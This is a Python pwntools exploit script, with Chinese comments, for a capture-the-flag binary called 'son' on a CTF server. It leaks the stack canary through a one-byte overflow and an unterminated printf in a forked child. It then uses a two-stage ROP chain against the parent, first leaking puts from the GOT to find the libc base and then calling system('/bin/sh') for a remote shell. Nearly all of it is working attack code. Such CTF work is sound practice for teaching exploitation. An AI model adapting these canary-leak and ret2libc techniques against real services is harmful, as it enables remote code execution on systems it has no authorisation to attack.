from pwn import *

context.binary = e = ELF('son', checksec=False)
libc = ELF('libc.so.6', checksec=False)   # 題目資料夾附帶，Ubuntu GLIBC 2.35

HOST, PORT = 'ctf.adl.tw', 10006

# ============================================================
# 整體流程（詳見 son_writeup.md）：
#
#   main() 呼叫 fork()：
#     - 子行程（"son"）執行 child()：read(0, buf[0x20], 0x19)
#       buf 只有 0x20(32) bytes，但 canary 在 buf+0x18(24) 這個位置，
#       read 長度 0x19(25) 剛好可以多蓋 1 byte，蓋掉 canary 最低位元組
#       （正常應該固定是 0x00）。child() 結尾用 _exit(0) 直接結束，
#       完全不檢查 canary —— 所以蓋這 1 byte 不會被抓到。
#       緊接著 printf("%s", buf) 會把 buf 當字串印出來，因為最低位元組
#       已經不是 0x00 了，%s 不會在那裡停下來，會繼續往後印，
#       把 canary 剩下 7 bytes（原本被那個 0x00 擋住印不出來的部分）
#       一起洩漏出來！
#     - 父行程（原本的 process）waitpid() 等子行程結束後，
#       執行 parent()：read(0, buf[0x20], 0x80) —— buf 一樣只有 32 bytes，
#       但這次能讀 128 bytes，是真正的 overflow，而且結尾真的有做
#       canary 檢查。因為 canary 是同一個 process 的同一份值
#       （fork 時整份記憶體，包括這個值，都複製給了子行程），
#       前面洩漏到的 canary 在這裡完全通用。
#
#   二進位本身沒有 execve/system，但：
#     - 是動態連結（libc.so.6 已經附在題目裡），可以用 ret2libc。
#     - gadget() 函式裡剛好擺了一個現成的 "pop rdi; ret"（0x4012f5），
#       省去自己找 gadget 的功夫。
#
#   Stage 1（第一次 overflow）：用洩漏到的 canary 填好，蓋 return address
#   成一串 ROP：
#       pop rdi; ret          -> rdi = got.puts（puts 的 GOT 位址）
#       ret                   -> 墊一個單獨的 ret，修正 16-byte 堆疊對齊
#       puts@plt              -> puts(got.puts 的內容) == 把 puts 已經被
#                                 解析出來的「真正 libc 位址」當成字串印出來
#       parent (0x4013a5)     -> 不要真的返回 main()，直接再跳回 parent()
#                                 開頭，製造「再給我們一次 read() 機會」
#
#   用這次洩漏到的 puts 真實位址，算出 libc_base。
#
#   Stage 2（第二次 overflow，在剛才被我們「召喚」回來的 parent() 裡）：
#   一樣填好 canary，蓋 return address 成：
#       pop rdi; ret          -> rdi = libc_base + /bin/sh 字串位址
#       ret                   -> 再墊一個對齊用的 ret
#       system@libc           -> system("/bin/sh")，拿到 shell
# ============================================================

BUF_SIZE = 0x20
SAVED_RBP = 0x8
OFFSET = BUF_SIZE + SAVED_RBP          # 0x28 (40)，buf 起點到 return address

POP_RDI = 0x4012f5                      # gadget() 裡現成的 "pop rdi; ret"
RET_ONLY = 0x4012f6                     # 同一個 gadget 裡，往後一個 byte 就是單獨的 "ret"
PARENT_ENTRY = 0x4013a5                 # parent() 函式開頭，之後拿來重新呼叫一次


def leak_canary(p):
    """利用 child() 的 1-byte overflow，讓 %s 把 canary 剩下 7 bytes 印出來。"""
    p.recvuntil(b'Tell me something:\n')

    # 送 25 bytes：前 24 bytes 隨便填，第 25 byte（也就是蓋到 canary 最低
    # 位元組的那一個）故意用非 0x00 的值（這裡用 'A'），讓 %s 不會在
    # 那裡停下來。
    payload = b'A' * 0x18 + b'A'        # 24 + 1 = 25 bytes = 0x19
    p.send(payload)

    p.recvuntil(b'Child says: ')
    leaked = p.recvuntil(b'\n', drop=True)

    # leaked 開頭是我們自己送的 25 bytes，後面才是真正洩漏出來的記憶體。
    extra = leaked[25:]
    if len(extra) < 7:
        raise RuntimeError(
            f'只洩漏到 {len(extra)} bytes（需要 7 bytes）。'
            '代表 canary 剩下的 7 bytes 裡，剛好有一個是 0x00，'
            '把 %s 提前截斷了（機率約 1/256 per byte）。'
            '請重新連線再試一次。'
        )
    canary_rest = extra[:7]
    canary = b'\x00' + canary_rest       # canary 的最低位元組固定是 0x00
    log.info('leaked canary bytes: %s', canary_rest.hex())
    log.info('full canary (little-endian bytes): %s', canary.hex())
    return canary


def overflow_payload(canary, chain_bytes, saved_rbp_filler=b'B' * 8):
    payload = b'A' * 0x18          # 填滿 buf 本體（不含 canary 的 0x18 bytes）
    payload += canary              # 原封不動放回正確的 canary
    payload += saved_rbp_filler    # saved rbp，內容不重要
    payload += chain_bytes         # 從這裡開始就是 return address
    assert len(payload) <= 0x80
    return payload


def main():
    p = remote(HOST, PORT, timeout=10)

    canary = leak_canary(p)

    # ---------- Stage 1：leak puts 的 libc 真實位址 ----------
    p.recvuntil(b'Tell me something:\n')   # parent() 的第一句 prompt

    stage1_chain = flat(
        POP_RDI, e.got['puts'],
        RET_ONLY,                 # 堆疊對齊
        e.plt['puts'],
        PARENT_ENTRY,              # 不回 main()，直接再跑一次 parent()
    )
    p.send(overflow_payload(canary, stage1_chain))

    p.recvuntil(b'Goodbye!\n')
    leaked = p.recvline(drop=True)
    leaked_puts = u64(leaked.ljust(8, b'\x00'))
    libc.address = leaked_puts - libc.symbols['puts']
    log.info('leaked puts@libc = %#x', leaked_puts)
    log.info('libc base        = %#x', libc.address)

    # ---------- Stage 2：system("/bin/sh") ----------
    p.recvuntil(b'Tell me something:\n')   # 被我們召喚回來的 parent() 第二次 prompt

    # 這裡故意不手動加 RET_ONLY 對齊——實際連線測試過，手動多塞一個 ret
    # 反而會讓 system() 呼叫前的堆疊對齊變成錯的（system 內部用到的
    # aligned 指令會直接 crash，連線在印完 "Goodbye!" 後無聲斷掉）。
    # 讓 pwntools 的 ROP() 用 son+libc 兩邊的 gadget 自動組，它自己就會
    # 算出不需要額外墊 ret 這件事。
    rop = ROP([e, libc])
    rop.system(next(libc.search(b'/bin/sh\x00')))
    p.send(overflow_payload(canary, rop.chain()))

    p.interactive()


if __name__ == '__main__':
    main()
